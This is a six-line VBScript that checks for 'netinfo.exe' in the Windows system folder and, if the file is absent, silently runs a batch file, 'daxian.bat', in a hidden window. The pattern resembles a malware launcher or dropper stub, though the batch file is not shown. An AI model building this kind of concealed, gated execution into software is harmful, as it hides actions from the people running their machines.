Set shell = CreateObject("Wscript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject") 
set dir = FSO.GetSpecialFolder(0)
If not fso.FileExists(dir&"\netinfo.exe") Then
shell.run "cmd /c daxian.bat",vbhide
end if